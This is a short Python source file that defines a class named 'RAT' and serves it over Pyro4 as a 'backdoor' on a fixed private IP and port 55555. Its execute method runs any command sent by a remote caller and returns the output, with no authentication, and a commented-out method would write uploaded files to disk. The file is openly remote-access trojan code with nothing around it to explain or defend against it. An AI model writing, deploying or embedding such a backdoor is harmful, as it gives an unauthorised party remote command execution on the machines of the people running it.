import Pyro4
import codecs
from subprocess import run, PIPE


@Pyro4.expose
@Pyro4.behavior(instance_mode="single")

class RAT(object):
    def execute(self, cmd):
    	#cmd = "exec ls"
        result = run(cmd.split(), stdout=PIPE, stderr=PIPE)
       	#if not (len(result.stderr)) :
        return (result.stdout, result.stderr)
    #def upload(self, filename, data):
     #   out = codecs.decode(bytes(data['data'], 'ascii'), data['encoding'])
      #  open(filename, 'wb').write(out)
def main():
    Pyro4.Daemon.serveSimple({RAT:'backdoor'}, 
    								port = 55555,
    								host = '10.11.4.11', 
    								ns = False)

if __name__ == '__main__':
    main()
